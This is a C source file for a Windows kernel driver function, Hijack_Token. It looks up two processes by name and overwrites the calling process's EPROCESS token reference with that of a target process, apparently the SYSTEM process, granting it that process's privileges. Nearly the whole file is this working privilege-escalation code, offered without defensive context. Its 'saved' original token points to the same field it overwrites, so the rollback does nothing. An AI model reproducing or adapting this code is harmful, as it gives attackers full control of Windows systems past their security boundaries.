#include "TokenHijack.h"
#include "Utility.h"

ULONG Hijack_Token(IN WCHAR* TargetProc, IN WCHAR* OurProc)
{
#ifdef _DEBUG 
	DbgPrint("[+]Hijack_Token() Function Called\n");
#endif
	
	ULONG				 status = 0;
	PEPROCESS			pid4 = NULL,
					   ourEP = NULL;
	PEX_FAST_REF	  og_Ref = NULL,
				     our_Ref = NULL,
				  target_Ref = NULL;
	CLIENT_ID	  targetCID = { 0 },
				     OurCID = { 0 };

	
	///securing memory for structs
	RtlSecureZeroMemory(&og_Ref, sizeof(PEX_FAST_REF));
	RtlSecureZeroMemory(&our_Ref, sizeof(PEX_FAST_REF));
	RtlSecureZeroMemory(&target_Ref, sizeof(PEX_FAST_REF));

	
	///getting Unique Process ID
	targetCID = Process_ID(TargetProc);
	if (targetCID.UniqueProcess != NULL)
	{
		OurCID = Process_ID(OurProc);
		if (OurCID.UniqueProcess != NULL)
		{

			if (NT_SUCCESS(status = PsLookupProcessByProcessId(targetCID.UniqueProcess, &pid4)))
			{

				if (!NT_SUCCESS(status = PsLookupProcessByProcessId(OurCID.UniqueProcess, &ourEP)))
				{

					status = STATUS_FAILED_EPROCESS;
					goto deref2;
				}
			}
			else
			{
				status = STATUS_FAILED_EPROCESS;
				goto end;
			}
		}
		else
		{
			status = STATUS_FAILED_PROC_ID;
			goto end;
		}
	}
	else 
	{
		status = STATUS_FAILED_PROC_ID;
		goto end;
	}
	
	
	
	
	///saving for later incase of problems
	og_Ref = (PEX_FAST_REF)((ULONG_PTR)ourEP + Token);
	
	///getting tokens
	target_Ref = (PEX_FAST_REF)((ULONG_PTR)pid4 + Token);
	our_Ref = (PEX_FAST_REF)((ULONG_PTR)ourEP + Token);

	if (target_Ref != NULL)
	{
		///swap
		our_Ref->T.Object = target_Ref->T.Object;
		our_Ref->T.Value = target_Ref->T.Value;
		
	}
	else
	{
		status = STATUS_NO_TOKEN_ADDRESS;
	}
	///final check
	if (our_Ref->T.Object != target_Ref->T.Object &&
		our_Ref->T.Value != target_Ref->T.Value)
	{
		
		our_Ref->T.Object = og_Ref->T.Object;
		our_Ref->T.Value = og_Ref->T.Value;
		
		status = STATUS_FAILED_TOKEN_SWAP;
	}
	else
	{
#ifdef _DEBUG 
		DbgPrint("[+]Operation Successfull\n");
#endif
		status = STATUS_SUCCESS;
	}


	
	
	ObDereferenceObject(ourEP);
	deref2:
	ObDereferenceObject(pid4);
	if (status == STATUS_SUCCESS) goto returnjmp;
	end:

#ifdef _DEBUG 
	DbgPrint("[+]Operation Unsuccessfull With Status 0x%I64x\n", status);
#endif

	returnjmp:
	
	return status;
}